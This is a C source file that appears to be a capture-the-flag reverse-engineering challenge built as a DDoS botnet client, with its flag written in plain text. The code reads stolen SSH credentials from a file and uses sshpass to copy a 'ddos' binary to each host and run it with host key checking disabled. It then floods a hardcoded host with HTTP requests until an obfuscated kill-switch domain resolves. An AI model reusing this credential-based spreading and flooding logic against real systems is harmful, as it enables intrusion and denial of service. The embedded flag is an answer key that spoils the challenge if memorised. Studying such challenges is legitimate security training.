#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <curl/curl.h>
#include <stdbool.h>

typedef struct addrinfo addrinfo;

#define FLAG "HHCTF{R3v3r51n9_C_15_T00_3a5y}"

#define HOSTNAME "wafflevikings.hh"

#define system_or_continue(command) ({ \
if (system(command) != 0) {          \
    continue;                        \
}                                    \
})

/// Display the text art
void displayTextArt(void) {
    printf(R"EOF(

▓█████▄ ▓█████▄  ▒█████    ██████     ▄████▄   ██▓     ██▓▓█████  ███▄    █ ▄▄▄█████▓
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒    ▒██▀ ▀█  ▓██▒    ▓██▒▓█   ▀  ██ ▀█   █ ▓  ██▒ ▓▒
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄      ▒▓█    ▄ ▒██░    ▒██▒▒███   ▓██  ▀█ ██▒▒ ▓██░ ▒░
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒   ▒▓▓▄ ▄██▒▒██░    ░██░▒▓█  ▄ ▓██▒  ▐▌██▒░ ▓██▓ ░ 
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒   ▒ ▓███▀ ░░██████▒░██░░▒████▒▒██░   ▓██░  ▒██▒ ░ 
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░   ░ ░▒ ▒  ░░ ▒░▓  ░░▓  ░░ ▒░ ░░ ▒░   ▒ ▒   ▒ ░░   
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░     ░  ▒   ░ ░ ▒  ░ ▒ ░ ░ ░  ░░ ░░   ░ ▒░    ░    
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░     ░          ░ ░    ▒ ░   ░      ░   ░ ░   ░      
   ░       ░        ░ ░        ░     ░ ░          ░  ░ ░     ░  ░         ░          
 ░       ░                           ░                                               



)EOF");
}

/// Function containing a special secret link
/// \return Size of the link (size_t)
size_t special_secret_link(void) {
    const char *link = "https://bit.ly/RedStarZarnitsa";
    return strlen(link);
}

/// Connect via SSH to get the DDOS client and execute it remotely
void transfer(void) {
    const char *client_file_name = "ddos"; //path to the ddos file

    //open file with ssh credentials from infected machine 
    FILE *file = fopen("credentials.csv", "r");
    if (!file) {
        perror("Failed to open the info file");
        return;
    }

    char line[256];
    char processed_ips[256] = ""; // List of ip already used
    bool chmod_executed = false;  // Flag for tracking chmod

    while (fgets(line, sizeof(line), file) != NULL) {
        char user[64];
        char password[64];
        char ip[64];
        char port[32];

        if (sscanf(line, "%[^;];%[^;];%s;%s", user, password, ip, port) != 4) { continue; }
        // Check if ip already used
        if (strstr(processed_ips, ip) == NULL) {
            // Ip not used for scp, execute scp
            snprintf(processed_ips + strlen(processed_ips), sizeof(processed_ips) - strlen(processed_ips), " %s",
                     ip);

            // Run ssh-keyscan to accept the unknown host
            char ssh_keyscan_command[256];
            snprintf(ssh_keyscan_command, sizeof(ssh_keyscan_command),
                     "ssh-keyscan -t ed25519 -H %s >> ~/.ssh/known_hosts", ip);
            system_or_continue(ssh_keyscan_command);

            // Transfer file using scp with sshpass
            char scp_command[256];
            snprintf(scp_command, sizeof(scp_command), "sshpass -p %s scp -P %s %s %s@%s:/tmp/", password, port,
                     client_file_name, user, ip);
            printf("Created command : %s\n", scp_command); // print command created
            system_or_continue(scp_command);
        }

        // SSH connection to the user on the specified IP
        char ssh_command[256];

        snprintf(ssh_command, sizeof(ssh_command),
                 "sshpass -p %s ssh -oStrictHostKeyChecking=no -p 22 -f %s@%s 'cd /tmp %s && nohup ./ddos > /dev/null 2>&1'",
                 password, user, ip, chmod_executed ? "" : "&& chmod +x ddos");

        if (!chmod_executed)
            chmod_executed = true;

        printf("Created command : %s\n", ssh_command); // show the current command
        system_or_continue(ssh_command);
    }

    fclose(file);
}

/// Check if the DDOS can run.
/// \param argc Number of arguments (const int *)
/// \param argv Arguments value (char * [])
/// \return True if the DDOS should run, false otherwise
bool pass(const int *argc, char *argv[]) {
    if (*argc != 1) {
        return false;
    }

    return strncmp(FLAG, argv[0], 31) == 0;
}

/// Get the dns entry
/// \param str Pointer to obtain the dns entry (char *)
void get_dns(char *str) {
    const char *foazuibcvi = "\x63\x6B\x2E\x6B";
    const char *nciuazbcvo = "\x69\x6C\x6C\x65\x72";
    const char *fjdoznvpzq = "\x73\x74\x6F\x70";
    const char *msdopzoinf = "\x61\x74\x74\x61";

    snprintf(str, 21, "%s%s%s%s",
             fjdoznvpzq,
             msdopzoinf,
             foazuibcvi,
             nciuazbcvo);
}

/// Get the curl prepared request
/// \param hostname domain/ip address to reach (const char *)
/// \return Curl prepare request (CURL *)
CURL *get_curl(const char *hostname) {
    CURL *curl = curl_easy_init();

    if (!curl) {
        exit(EXIT_FAILURE);
    }

    char url[28];
    snprintf(url, 28, "http://%s", hostname);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_PORT, 80);
    curl_easy_setopt(curl, CURLOPT_USERAGENT,
                     "RedStarBrowser/3.0 (XK-256; Zarnitsa OS x86_64)"); //add custom user agent

    return curl;
}

/// Send the prepared curl request
/// \param curl Curl structure for the request (CURL *)
void ddos(CURL *curl) {
    CURLcode resolution;

    freopen("/dev/null", "w", stdout); //don't show the get result
    resolution = curl_easy_perform(curl);
    freopen("/dev/tty", "w", stdout); // reestablished the standard output

    if (resolution != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(resolution));
    } else {
        fputs("DDoS attack was successful.\n", stdout);
    }

    fflush(stdout);
}

/// Check if a DNS entry exist
/// \param entry DNS entry to check (char *)
/// \param dns_result DNS response address information (addrinfo **)
/// \return True if the entry exists, false otherwise (bool)
bool check(const char *entry, addrinfo **dns_result) {
    return getaddrinfo(entry, NULL, NULL, dns_result) == 0;
}

int main(int argc, char *argv[]) {
    displayTextArt();

    argc--;
    argv++;

    if (!pass(&argc, argv)) {
        return EXIT_SUCCESS;
    }

    transfer();

    CURL *curl = get_curl(HOSTNAME);

    addrinfo *dns_result;

    char dns[18];
    get_dns(dns);

    while (!check(dns, &dns_result)) {
        ddos(curl);
        sleep(5);
    }

    curl_easy_cleanup(curl);
    freeaddrinfo(dns_result);

    return EXIT_SUCCESS;
}
